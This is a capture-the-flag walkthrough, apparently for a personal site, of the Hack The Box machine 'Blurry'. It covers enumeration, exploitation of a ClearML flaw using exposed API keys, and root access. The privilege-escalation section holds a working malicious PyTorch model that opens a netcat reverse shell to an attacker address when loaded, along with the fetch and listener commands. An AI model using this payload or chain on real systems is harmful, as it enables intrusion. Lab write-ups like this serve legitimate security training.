@@ -1,0 +1,291 @@
+---
+title: Blurry
+banner: /avatars/blurry.webp
+difficulty: medium
+os: linux
+releaseDate: 2024-06-08
+pwnDate: 2024-06-14
+slug: "blurry"
+achievement: https://www.hackthebox.com/achievement/machine/701907/605
+user: [53,56,144,198,242,118,75,23,7,16]
+root: [83,95,157,143,168,60,40,11,4,10]
+---
+
+import Browser from "@/components/Browser.astro" 
+
+## Enumeration
+
+```bash
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.19 -oG allPorts
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+```
+
+```bash
+sudo nmap -p -sCV 10.10.11.19 -oN targeted
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://app.blurry.htb/
+|_http-server-header: nginx/1.18.0
+```
+
+```bash
+sudo sh -c 'echo "10.10.11.19 blurry.htb app.blurry.htb" >> /etc/hosts'
+```
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://blurry.htb -H "Host: FUZZ.blurry.htb" -fs 169
+
+files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 61ms]
+app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 56ms]
+chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 130ms]
+```
+
+<Browser
+  url="app.blurry.htb/dashboard"
+  src="/walkthroughs/blurry/0.png"
+/>
+
+<Browser
+  url="chat.blurry.htb"
+  src="/walkthroughs/blurry/1.png"
+/>
+
+`jippity`
+
+## Exploitation
+
+```bash
+sudo apt install python3.11-venv
+python3 -m venv .env
+source .env/bin/activate
+pip install clearml
+clearml-init
+```
+
+```
+api {
+  web_server: http://app.blurry.htb
+  api_server: http://api.blurry.htb
+  files_server: http://files.blurry.htb
+  credentials {
+    "access_key" = "B0KCP3QYFV1IZFS9SRY2"
+    "secret_key" = "I6iImsuAGcxECntt3HZSYwkoMtmoZJ9NYyy0eNGQBQ0Ol3VhMH"
+  }
+}
+```
+
+https://github.com/DemonPandaz2763/CVE-2024-24590.git
+
+```bash
+jippity@blurry:~$ cat user.txt
+85fdd3c30f09caeb0fd4fa4dbec25fb1
+```
+
+##  Privilege escalation
+
+```bash
+jippity@blurry:~$ sudo -l
+Matching Defaults entries for jippity on blurry:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jippity may run the following commands on blurry:
+    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
+```
+
+```
+drwxrwxr-x   2 root jippity  4096 Jun 14 15:22 models
+```
+
+```python
+import torch
+import torch.nn as nn
+import os
+
+class Exploit(nn.Module):
+    def __init__(self):
+        super(Exploit, self).__init__()
+        self.dense = nn.Linear(10, 1)
+
+    def forward(self, x):
+        return self.dense(x)
+
+    def __reduce__(self):
+        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 4000 >/tmp/f"
+        return os.system, (cmd,)
+
+model = Exploit()
+torch.save(model, 'exploit.pth')
+```
+
+```bash
+python3 -m http.server 80
+```
+
+```bash
+jippity@blurry:/models$ wget http://10.10.14.36/exploit.pth             
+--2024-06-14 15:20:51--  http://10.10.14.36/exploit.pth
+Connecting to 10.10.14.36:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 928 [application/octet-stream]
+Saving to: ‘exploit.pth’
+
+exploit.pth         100%[===================>]     928  --.-KB/s    in 0s      
+
+2024-06-14 15:20:51 (67.4 MB/s) - ‘exploit.pth’ saved [928/928]
+```
+
+```bash
+jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/exploit.pth
+[+] Model /models/exploit.pth is considered safe. Processing...
+```
+
+```bash
+nc -lvnp 4000            
+listening on [any] 4000 ...
+connect to [10.10.14.36] from (UNKNOWN) [10.10.11.19] 56866
+# cat /root/root.txt
+5175188a6a603edf71faf262642027ca
+```
+
+##  Appendices
+
+`/usr/bin/evaluate_model`
+
+```bash
+#!/bin/bash
+# Evaluate a given model against our proprietary dataset.
+# Security checks against model file included.
+
+if [ "$#" -ne 1 ]; then
+    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
+    exit 1
+fi
+
+MODEL_FILE="$1"
+TEMP_DIR="/models/temp"
+PYTHON_SCRIPT="/models/evaluate_model.py"  
+
+/usr/bin/mkdir -p "$TEMP_DIR"
+
+file_type=$(/usr/bin/file --brief "$MODEL_FILE")
+
+# Extract based on file type
+if [[ "$file_type" == *"POSIX tar archive"* ]]; then
+    # POSIX tar archive (older PyTorch format)
+    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
+elif [[ "$file_type" == *"Zip archive data"* ]]; then
+    # Zip archive (newer PyTorch format)
+    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
+else
+    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
+    exit 2
+fi
+
+/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
+    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")
+
+    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
+        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
+        /bin/rm "$MODEL_FILE"
+        break
+    fi
+done
+
+/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
+/bin/rm -rf "$TEMP_DIR"
+
+if [ -f "$MODEL_FILE" ]; then
+    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
+    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
+    
+fi
+```
+
+```python
+import torch
+import torch.nn as nn
+from torchvision import transforms
+from torchvision.datasets import CIFAR10
+from torch.utils.data import DataLoader, Subset
+import numpy as np
+import sys
+
+
+class CustomCNN(nn.Module):
+    def __init__(self):
+        super(CustomCNN, self).__init__()
+        self.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1)
+        self.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1)
+        self.pool = nn.MaxPool2d(kernel_size=2, stride=2, padding=0)
+        self.fc1 = nn.Linear(in_features=32 * 8 * 8, out_features=128)
+        self.fc2 = nn.Linear(in_features=128, out_features=10)
+        self.relu = nn.ReLU()
+
+    def forward(self, x):
+        x = self.pool(self.relu(self.conv1(x)))
+        x = self.pool(self.relu(self.conv2(x)))
+        x = x.view(-1, 32 * 8 * 8)
+        x = self.relu(self.fc1(x))
+        x = self.fc2(x)
+        return x
+
+
+def load_model(model_path):
+    model = CustomCNN()
+    
+    state_dict = torch.load(model_path)
+    model.load_state_dict(state_dict)
+    
+    model.eval()  
+    return model
+
+def prepare_dataloader(batch_size=32):
+    transform = transforms.Compose([
+        transforms.RandomHorizontalFlip(),
+        transforms.RandomCrop(32, padding=4),
+        transforms.ToTensor(),
+        transforms.Normalize(mean=[0.4914, 0.4822, 0.4465], std=[0.2023, 0.1994, 0.2010]),
+    ])
+    
+    dataset = CIFAR10(root='/root/datasets/', train=False, download=False, transform=transform)
+    subset = Subset(dataset, indices=np.random.choice(len(dataset), 64, replace=False))
+    dataloader = DataLoader(subset, batch_size=batch_size, shuffle=False)
+    return dataloader
+
+def evaluate_model(model, dataloader):
+    correct = 0
+    total = 0
+    with torch.no_grad():  
+        for images, labels in dataloader:
+            outputs = model(images)
+            _, predicted = torch.max(outputs.data, 1)
+            total += labels.size(0)
+            correct += (predicted == labels).sum().item()
+    
+    accuracy = 100 * correct / total
+    print(f'[+] Accuracy of the model on the test dataset: {accuracy:.2f}%')
+
+def main(model_path):
+    model = load_model(model_path)
+    print("[+] Loaded Model.")
+    dataloader = prepare_dataloader()
+    print("[+] Dataloader ready. Evaluating model...")
+    evaluate_model(model, dataloader)
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print("Usage: python script.py <path_to_model.pth>")
+    else:
+        model_path = sys.argv[1]  # Path to the .pth file
+        main(model_path)
+```
